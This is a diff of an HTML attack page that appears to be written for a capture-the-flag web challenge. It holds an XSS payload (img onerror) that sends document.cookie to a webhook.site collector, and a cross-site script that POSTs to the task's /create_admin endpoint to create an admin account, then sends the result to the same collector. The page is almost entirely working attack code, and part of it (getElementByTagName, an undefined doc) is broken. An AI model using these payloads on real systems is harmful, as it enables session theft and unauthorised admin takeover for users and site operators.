@@ -2,11 +2,11 @@
 <html>
                 <body>
 
-                    <a href="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q=" target="frame" id="link">Go to admin login</a>
-                    <!-- <img src="x" onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt="">
-          -->
+                    <!-- <a href="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q=" target="frame" id="link">Go to admin login</a>
+                    <!-- <img src="x" onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt=""> -->
+       
 <script>
-
+(async()=>{
 const res = await fetch('https://tasks.goidactf.ru:20079/create_admin',
 {
     method:'POST',
@@ -18,9 +18,12 @@ const res = await fetch('https://tasks.goidactf.ru:20079/create_admin',
     mode:'no-cors',
     body:'new_admin_login=juuzo'
 })
-const text = await res.text();
+const text = res.status;
 doc.getElementByTagName("button")[0].click();
-fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+text).then(r=>r.text()).then(d=>console.log(d))</script>
+fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+text).then(r=>r.text()).then(d=>console.log(d))
+
+})();
+</script>
 
 
                 </body>
